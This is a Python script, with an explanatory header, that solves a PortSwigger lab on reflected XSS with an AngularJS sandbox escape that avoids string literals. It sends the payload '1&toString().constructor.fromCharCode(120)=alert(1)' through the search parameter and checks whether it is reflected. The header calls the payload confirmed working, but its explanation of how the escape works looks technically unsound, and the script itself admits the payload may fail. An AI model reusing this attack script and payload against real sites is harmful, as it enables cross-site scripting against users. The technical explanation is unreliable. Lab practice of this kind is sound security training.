# Lab 27 — Reflected XSS with AngularJS sandbox escape without strings
# PortSwigger: https://portswigger.net/web-security/cross-site-scripting/contexts/angularjs-sandbox/lab-angular-sandbox-escape-without-strings
#
# Vulnerability: Search — AngularJS expression, string literals blocked
# Aim:           Call alert(1) without using any string literals
#
# Technique:
#   The AngularJS sandbox blocks direct window/Function access.
#   String literals ('...', "...") are additionally blocked.
#
#   Build strings from char codes using the String constructor:
#     toString().constructor.fromCharCode(N)
#   This avoids ever writing a quoted string literal.
#
#   Confirmed working payload for AngularJS 1.x:
#     1&toString().constructor.fromCharCode(120)=alert(1)
#
#   How it works:
#     - toString() returns '' (empty string) — a String object
#     - .constructor is String
#     - .fromCharCode(120) builds a string from char code 120 ('x')
#     - Assigning = alert(1) is evaluated as part of the expression
#
#   ⚠  AngularJS sandbox escapes are version-specific.
#      Check the PortSwigger cheat sheet for your target's AngularJS version.
#      https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
#
# Usage: python xss_lab27.py <url>

import sys
import urllib3
from proxies import proxies
from xss_utils import banner, section, make_session, check_reflection

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

PAYLOAD = "1&toString().constructor.fromCharCode(120)=alert(1)"

if __name__ == "__main__":
    banner()
    section("LAB 27 — REFLECTED XSS: AngularJS SANDBOX ESCAPE, NO STRING LITERALS")

    if len(sys.argv) != 2:
        print("  Usage: python xss_lab27.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    session = make_session(proxies)

    print(f"  ➜  Sending sandbox-escape payload:\n     {PAYLOAD}\n")
    r = session.get(url, params={"search": PAYLOAD})

    check_reflection(r.text, PAYLOAD, "AngularJS no-strings escape")

    print()
    print("  ➜  Open this URL in a browser:")
    print(f"     {r.url}")
    print()
    print("  ℹ  Builds strings via fromCharCode() — no quoted string literals needed.")
    print("     Sandbox escapes are version-specific — consult the PortSwigger cheat sheet")
    print("     if this payload does not work with the lab's AngularJS version.")
